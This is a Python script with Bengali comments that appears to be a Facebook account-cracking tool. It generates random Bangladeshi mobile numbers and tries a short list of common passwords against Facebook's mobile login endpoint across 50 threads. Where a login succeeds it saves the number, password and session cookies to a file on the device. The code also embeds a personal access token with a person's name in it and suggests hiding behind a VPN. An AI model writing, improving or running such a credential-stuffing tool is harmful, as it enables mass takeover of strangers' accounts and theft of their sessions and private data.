import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor

# রঙ সেটআপ
G = '\033[1;32m'; R = '\033[1;31m'; Y = '\033[1;33m'; W = '\033[1;37m'
loop = 0
ok = []

# জিলানি ভাইয়ের সাকসেস টোকেন ও হেডার
JILANI_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzM3NzkyMDE5MjYsInRva2VuIjoiYTF3MHctLXpsSVJLU2tuVnAyMzlYMjlNQXdySVhUZm1NT2NyZEVtNDFTWW9LTTY4T1hyUVhFVGZEODREdkQtbSIsImNvdW50cnlDb2RlIjoiYmQiLCJuYW1lIjoiTWQgTWFsZWsgSXNsYW0iLCJpc0FwcEFjY291bnQiOnRydWUsImlhdCI6MTc3MTM2MDAwMX0.mppo695Is8Df50m0kp9Gczf8e_MbsrDqZi4gqjEWF7M"
USER_AGENT = "Mozilla/5.0 (Linux; Android 13; V2055 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36 EdgA/121.0.2277.107"

def banner():
    os.system('clear')
    print(f"""{G}
    ███    ███  ███████  ████████  █████  
    ████  ████  ██          ██    ██   ██ 
    ██ ████ ██  █████       ██    ███████ 
    ██  ██  ██  ██          ██    ██   ██ 
    ██      ██  ███████     ██    ██   ██ 
{W}------------------------------------------------
 [✓] VERSION : ULTRA POWERFUL VIVO-V2055
 [✓] ENGINE  : EDGE-MOBILE-AJAX (PREMIUM)
 [✓] STATUS  : CERTIFICATE BYPASS ACTIVE
------------------------------------------------""")

def engine(uid, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[JILANI-ULTRA] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    # শক্তিশালী পাসওয়ার্ড লিস্ট
    pws = [uid, uid[6:], uid[:6], 'bangladesh', 'khan123', 'mim123', '778899', '@@##1122']
    
    for pas in pws:
        if len(pas) < 6: continue
        session = requests.Session()
        
        try:
            # DNS বাইপাস করার জন্য সরাসরি মোবাইল ইউআই
            free_fb = session.get('https://m.facebook.com').text
            lsd = re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1)
            
            headers = {
                'authority': 'm.facebook.com',
                'user-agent': USER_AGENT,
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '/',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/',
                'accept-language': 'en-US,en;q=0.9',
            }

            data = {
                "lsd": lsd, "jazoest": jazoest,
                "email": uid, "pass": pas, "login": "Log In"
            }

            post = session.post('https://m.facebook.com/login/device-based/regular/login/', data=data, headers=headers)

            if 'c_user' in session.cookies.get_dict():
                ok.append(uid)
                print(f'\n{G}[SUCCESS-OK💚] {uid} | {pas}')
                ck = "; ".join([f"{k}={v}" for k, v in session.cookies.get_dict().items()])
                open('/sdcard/JILANI_OK.txt', 'a').write(f'{uid}|{pas}|{ck}\n')
                break
        except: pass
    loop += 1

def start():
    banner()
    code = input(f'{G}[+] ENTER CODE (017/018/019): {W}')
    limit = 100000 
    with ThreadPoolExecutor(max_workers=50) as submit:
        banner()
        print(f'{G}[+] TARGET CODE: {code} | LIMIT: {limit}')
        print(f'{Y}[!] TIP: URBAN VPN SINGAPORE IS ACTIVE')
        print(f'{W}------------------------------------------------\n')
        for _ in range(limit):
            uid = code + "".join(random.choices("0123456789", k=8))
            submit.submit(engine, uid, limit)

if _name_ == "_main_":
    start()
